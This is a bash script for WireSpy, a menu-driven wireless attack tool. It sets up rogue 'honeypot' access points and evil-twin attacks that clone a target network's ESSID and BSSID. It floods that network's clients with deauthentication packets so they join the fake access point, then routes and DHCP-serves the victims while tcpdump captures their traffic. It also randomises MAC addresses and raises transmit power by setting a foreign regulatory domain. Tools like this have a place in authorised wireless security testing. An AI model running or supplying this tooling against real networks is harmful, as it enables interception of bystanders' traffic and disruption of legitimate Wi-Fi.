#!/usr/bin/env bash
#
#    Copyright (C) 2015 - 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# Possible improvement:
# * select the interface using the cursors rather than typing the name
# * add option set colors on/off

declare -gr SCRIPT_VERSION=0.5

declare -gr BRANCH='dev'

BOLD='\e[1m'
DIM='\e[2m'
RESET_ALL='\e[0m'
RESET_BOLD='\e[21m'
RESET_FG='\e[39m'
UNDERLINED='\e[4m'

FG_BLACK='\e[30m'
FG_CYAN='\e[36m'
FG_GREEN='\e[32m'
FG_YELLOW='\e[33m'
FG_WHITE='\e[97m'

BG_BLUE='\e[44m'
BG_CYAN='\e[46m'
BG_DARKGREY='\e[100m'
BG_GREEN='\e[42m'
BG_RED='\e[41m'
BG_YELLOW='\e[43m'

declare -g  PROMPT="${BG_GREEN}${FG_WHITE}wirespy$RESET_ALL »"
declare -gr PROMPT_EVILTWIN="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > eviltwin$RESET_ALL »"
declare -gr PROMPT_HONEYPOT="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > honeypot$RESET_ALL »"
declare -gr PROMPT_POWERUP="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > powerup$RESET_ALL »"

isAP=false
# isDNS=false
isSniffing=false

declare -i attack_type=0

INTF=''
MINTF=''
TINTF=''
WCHAN=''
WINTF=''

XTERM_AIRBASE_PID=''
AIRODUMP_PID=''
TCPDUMP_PID=''

declare -gr AIRBASE_ERROR='An error occurred with airbase-ng, no tap interface was created'
declare -gr AP_PREREQUISITE='To use this option, first configure an access-point'
declare -gr EVILTWIN='This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID and wireless channel as the targeted access point.
To properly perform this attack the attacker should first scan all the in-range access points to select a target. Next step is to copy the BSSID, ESSID and channel of the 
selected target access point, to create its twin. 
The final step is to deauthenticate all the clients from the target access point, so that the victims may connect to the evil twin.'
declare -gr HONEYPOT='The Blackhole access point type will respond to all probe requests (the access point may receive a lot of requests in areas with high levels of WiFi activity such as crowded public places).
The Bullzeye access point type will respond only to the probe requests specifying the access point ESSID.
    1) Blackhole
    2) Bullzeye'
declare -gr INVALID_CHOICE='Invalid answer, type yes or no'

declare -a required_packages=(
    'aircrack-ng'
    'git'
    'grep'
    'isc-dhcp-server'
    'macchanger'
    'procps'
    'rfkill'
    'iproute2'
    'iw'
    'tcpdump'
    'xterm'
)

trap quit INT

print_wirespy() { echo -e "${BG_GREEN}${FG_WHITE}wirespy$RESET_ALL » $1"; }
print_error()    { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > error$RESET_ALL » $1"; }
print_info()     { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > info$RESET_ALL » $1"; }
print_intf()     { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > intf$RESET_ALL » $1"; }
print_warning()  { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > warning$RESET_ALL » $1"; }


function banner() {
    echo -e "${BOLD}WireSpy v$SCRIPT_VERSION${RESET_ALL} (type '${BOLD}help${RESET_ALL}' for a list of commands)"
    echo -e "${UNDERLINED}${DIM}Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31\n$RESET_ALL"
}


function check_update() {
    print_info 'Checking for an update...'

    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]; then
        if [[ $(git diff --name-only origin/$BRANCH -- ${0}) ]]; then
            print_info 'A new version is available, consider updating using the command: git reset --hard && git pull origin $BRANCH --rebase'
        else
            print_info 'This is the latest stable version'
        fi
    else
        print_warning "It is recommended to fetch $0 on GitHub using the command: git clone https://github.com/AresS31/wirespy"
    fi
}


function check_compatibility() {
    print_info 'Checking for dependencies...'

    for package in "${required_packages[@]}"; do
        if [[ $(dpkg -s $package 2> /dev/null) ]]; then
            continue
        else
            print_error "The $package package is missing, install it using the command: sudo apt-get install $package -y"
            exit 1
        fi
    done

    print_info 'All the required packages are already installed'
}


function help {
    echo -e """
${FG_GREEN}help$RESET_FG          : list available commands
${FG_GREEN}clear$RESET_FG         : clear the screen
${FG_GREEN}quit$RESET_FG          : exit the script gracefully
${FG_GREEN}run honeypot$RESET_FG  : launch a rogue access point
${FG_GREEN}run eviltwin$RESET_FG  : launch an evil-twin attack
${FG_GREEN}show leases$RESET_FG   : display the DHCP leases
${FG_GREEN}start capture$RESET_FG : start packet capture
${FG_GREEN}stop capture$RESET_FG  : stop packet capture
${FG_GREEN}run powerup$RESET_FG   : run powerup wireless interface
"""
}


function menu() {
    while :; do
        PROMPT=$PROMPT
        read -p "$(echo -e $PROMPT) " choice

        case $choice in
            'clear')
                reset
                ;;
            'quit')
                quit
                ;;
            'help')
                help
                ;;
            'run eviltwin')
                clean_up &> /dev/null
                PROMPT=$PROMPT_EVILTWIN
                configure_intfs
                configure_eviltwin
                isAP=true
                ;;
            'run honeypot')
                clean_up &> /dev/null
                PROMPT=$PROMPT_HONEYPOT
                configure_intfs
                configure_honeypot
                isAP=true
                ;;
            'run powerup')
                PROMPT=$PROMPT_POWERUP
                intf_boost
                ;;
            'show leases')
                if [[ $isAP = false ]]; then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $(cat /var/run/dhcpd.pid) ]]; then
                        cat /var/lib/dhcp/dhcpd.leases
                    else
                        print_warning 'The DHCP server has not been started'
                    fi
                fi
                ;;
            'start capture')
                if [[ $isAP = false ]]; then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = false ]]; then
                        print_info "Packet capture started, the resulting file will be ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
                        TCPDUMP_PID=$(tcpdump -i $TINTF -w ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
                        isSniffing=true
                    else
                        print_warning 'The traffic is already being captured'
                    fi
                fi
                ;;
            'stop capture')
                if [[ $isAP = false ]]; then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = true ]]; then
                        print_info "Packet capture stopped"
                        kill -SIGKILL "$TCPDUMP_PID"
                        isSniffing=false
                    else
                        print_warning 'No packet capture has been launched'
                    fi
                fi
                ;;
            *)
                print_warning "Unknown or invalid syntax '$choice', type help for the help menu"
                ;;
        esac
    done
}


function configure_intfs() {
    local pass=false
    local -i res=1

    print_wirespy 'Select the internet-facing interface:'

    display_intf

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT) " INTF
        check_intf "$INTF"
        res=$?
    done
    res=1

    print_wirespy "Do you wish to randomise $INTF MAC address (can cause problems)?"

    while [[ $pass = false ]]; do
        read -p "$(echo -e $PROMPT) " choice

        if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
            print_info "Randomising $INTF MAC address..."
            ip link set "$INTF" down && macchanger -A "$INTF" 1> /dev/null && ip link set "$INTF" up
            print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
            pass=true
        elif [[ $choice = 'n' || $choice = 'no' ]]; then
            pass=true
        else
            print_warning "$INVALID_CHOICE"
        fi
    done
    pass=false

    print_wirespy 'Select the wireless interface to use:'

    display_wintf

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT) " WINTF
        check_intf "$WINTF"
        res=$?

        if [[ $WINTF = "$INTF" ]]; then
            print_warning "$INTF is already in use, select another interface"
            res=1
        fi
    done
    res=1

    # prevent wlan adapter soft blocking
    rfkill unblock wifi

    # put the wireless interface into "monitor" mode
    # add a check to ensure monitor mode has started or exit the script
    print_info "Starting monitor mode on $WINTF..."
    iw dev "$WINTF" set type monitor
    MINTF=$WINTF
    # crucial to let WINTF come up before macchanging
    sleep 2

    check_intf "$MINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "$WINTF could not enter monitor mode"
        exit 1
    fi

    print_wirespy "Do you wish to randomise $MINTF MAC address (recommended)?"

    while [[ $pass = false ]]; do
        read -p "$(echo -e $PROMPT) " choice

        if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
            print_info "Randomising $MINTF MAC address..."
            ip link set "$MINTF" down && macchanger -A "$MINTF" 1> /dev/null && ip link set "$MINTF" up
            pass=true
        elif [[ $choice = 'n' || $choice = 'no' ]]; then
            pass=true
        else
            print_warning "$INVALID_CHOICE"
        fi
    done
}


function configure_honeypot() {
    local -i attack_type=0
    local pass=false
    local -i res=1

    echo "$HONEYPOT"

    while [[ $pass = false ]]; do
        read -p "$(echo -e $PROMPT) " attack_type

        case $attack_type in
            [1-2])
                pass=true
                ;;
            *) 
                print_warning "Invalid option: $attack_type"
                pass=false
                ;;
        esac
    done
    pass=false

    print_wirespy 'Access point ESSID?'
    read -p "$(echo -e $PROMPT) " ESSID

    while [[ $pass = false ]]; do
        print_wirespy 'Enter the wireless channel to use (value must be between 1 and 12):'
        read -p "$(echo -e $PROMPT) " WCHAN

        case $WCHAN in 
            [1-9]|1[0-2])
                pass=true
                ;;
            *) 
                print_warning "$WCHAN is not a valid wireless channel"
                pass=false
                ;;
        esac
    done
    pass=false

    while [[ $pass = false ]]; do
        print_wirespy 'Configure WEP authentication for the access-point?'
        read -p "$(echo -e $PROMPT) " choice

        if [[ $attack_type = 1 ]]; then
            if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
                print_wirespy 'Enter a WEP password (value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 
                
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                XTERM_AIRBASE_PID=$!
                pass=true
            elif [[ $choice = 'n' || $choice = 'no' ]]; then
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                XTERM_AIRBASE_PID=$!
                pass=true
            else
                print_warning "$INVALID_CHOICE"
                pass=false
            fi

        elif [[ $attack_type = 2 ]]; then
            if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
                print_wirespy 'Enter a WEP password (value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 

                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                XTERM_AIRBASE_PID=$!
                pass=true
            elif [[ $choice = 'n' || $choice = 'no' ]]; then
                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                XTERM_AIRBASE_PID=$!
                pass=true
            else
                print_warning "$INVALID_CHOICE"
                pass=false
            fi
        fi
    done

    sleep 4     # crucial, to let TINTF come up before setting it up  

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
    check_intf "$TINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "$AIRBASE_ERROR"
        sleep 4
        quit
    fi

    set_up_iptables
    set_up_DHCP_server
    
    print_info "$ESSID honeypot is now running..."
    sleep 6
}


function configure_eviltwin() {
    local pass=false
    local -i res=1

    echo "$EVILTWIN"

    print_wirespy 'ESSID for the evil-twin?'
    read -p "$(echo -e $PROMPT) " eviltwin_ESSID

    print_wirespy 'BSSID for the evil-twin?'
    read -p "$(echo -e $PROMPT) " eviltwin_BSSID

    while [[ $pass = false ]]; do
        print_wirespy "Enter the wireless channel to use (value must be identical to the legitimate access-point to spoof):"
        read -p "$(echo -e $PROMPT) " WCHAN

        case $WCHAN in
            [1-9]|1[0-2])
                pass=true
                ;;
            *) 
                print_warning "Invalid wireless channel: $WCHAN"
                pass=false
                ;;
        esac
    done

    xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
    XTERM_AIRBASE_PID=$!
    echo "XTERM XTERM_AIRBASE_PID $XTERM_AIRBASE_PID"
    sleep 4     # crucial to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
    check_intf "$TINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "$AIRBASE_ERROR"
        quit
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID $MINTF" &
    XTERM_AIREPLAY_PID=$!
    echo "XTERM XTERM_AIREPLAY_PID $XTERM_AIREPLAY_PID"
    sleep 4

    set_up_iptables
    set_up_DHCP_server
    
    print_info "$eviltwin_ESSID evil-twin is now running..."
    sleep 6
}


function set_up_iptables() {
    print_info 'Configuring NAT iptables...'

    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain

    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o "$INTF" -j MASQUERADE
}


function set_up_DHCP_server() {
    print_info 'Enabling IP forwarding'
    echo '1' > /proc/sys/net/ipv4/ip_forward

    # setting up ip address and route
    ip addr flush dev "$TINTF"
    ip link set "$TINTF" down && ip addr add 10.0.0.254/24 dev "$TINTF" && ip link set "$TINTF" up
    ip route flush dev "$TINTF"
    ip route add 10.0.0.0/24 via 10.0.0.254 dev "$TINTF"

    # reset any pre-existing dhcp leases
    print_info 'Resetting pre-existing DHCP leases'
    cat /dev/null > /var/lib/dhcp/dhcpd.leases
    cat /dev/null > /tmp/dhcpd.conf

    # copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    print_info 'Backing up /etc/dhcp/dhcpd.conf, /etc/default/isc-dhcp-server and importing the new configurations'
    cp --backup ./conf/dhcpd.conf /etc/dhcp/dhcpd.conf
    sed -i.bak -e "s/INTERFACESv4=.*/INTERFACESv4=\"${TINTF}\"/" /etc/default/isc-dhcp-server

    # starting the DHCP service
    print_info 'Starting DHCP server to provide the victims with internet access...'
    /etc/init.d/isc-dhcp-server restart 
    sleep 4
}


function display_intf() {
    intfs=$(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo')

    if [[ $intfs ]]; then
        for intf in $intfs; do # get the network interfaces names
            IP=$(ip -o -f inet add show "$intf" | awk '{print $4}')
            MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
            print_wirespy "${intf}: $IP $MAC"
        done
    else
        print_error 'No networking interface detected'
        exit 1
    fi
}


# use the iw utility instead of the ip utility
function display_wintf() {
    wintfs=$(ip -o link show | awk -F': ' '{print $2}' | grep 'wlan')

    if [[ $wintfs ]]; then
        for wintf in $wintfs; do # get the interfaces names
            IP=$(ip -o -f inet add show "$wintf" | awk '{print $4}')
            MAC=$(ip link show "$wintf" | awk '/ether/ {print $2}')
            print_wirespy "${wintf}: $IP $MAC"
        done
    else
        print_error 'No wireless interface detected'
        exit 1
    fi
}


function check_intf() {
    if [[ $(ip link show "$1" 2> /dev/null) ]]; then
        return 0
    else
        print_warning "Invalid interface: $1"
        return 1
    fi
}


function intf_boost() {
    local -i res=1
    local WINTF=''

    print_wirespy 'Select the wireless interface to boost-up:'

    display_wintf

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT_POWERUP) " WINTF
        check_intf "$WINTF"
        res=$?
    done

    print_wirespy "Enter the power boost (up to 30dBm) to apply to ${WINTF}:"
    read -p "$(echo -e $PROMPT_POWERUP) " boost

    print_info "$WINTF powering up..."
    # Bolivia allows high frequency power
    ip link set "$WINTF" down && iw reg set BO && iw dev "$WINTF" set txpower fixed "$boost"mBm && ip link set "$WINTF" up
    sleep 4
}


function clean_up() {
    local pass=false
    local -i res=1

    if [[ $isAP = true ]]; then
        print_info "Terminating active processes..."
        kill -SIGKILL "$XTERM_AIRBASE_PID" "$XTERM_AIREPLAY_PID"
        sleep 4
    
        print_info "Removing temporary files"
        rm -f ./conf/tmp.txt

        check_intf "$MINTF"
        res=$?

        if [[ $res = 0 ]]; then
            # add a check to ensure that managed mode has started or print warning
            print_info "Starting managed mode on $MINTF..." 
            iw dev "$MINTF" set type managed
            sleep 2
        fi
        pass=false

        print_info 'Flushing iptables'
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain

        print_info 'Disabling IP forwarding'
        echo '0' > /proc/sys/net/ipv4/ip_forward

        print_info 'Restoring /etc/dhcp/dhcpd.conf and /etc/default/isc-dhcp-server original configurations'
        mv /etc/dhcp/dhcpd.conf~ /etc/dhcp/dhcpd.conf
        mv /etc/default/isc-dhcp-server.bak /etc/default/isc-dhcp-server

        print_info 'Stopping DHCP server...'
        /etc/init.d/isc-dhcp-server stop
    fi
    if [[ $isSniffing = true ]]; then
        print_info "Terminating TCPDump..."
        kill -SIGKILL "$TCPDUMP_PID"
        sleep 4
    fi
}


function quit() {
    clean_up
    exit
}


# ensure that the script is running with root privileges
# this step is necessary since WireSpy needs to be perform network changes
if [[ $EUID -ne 0 ]]; then
    print_error "You must run this script as as root using the command: sudo bash ${0}"
    exit 1
fi


banner
check_update
check_compatibility
menu
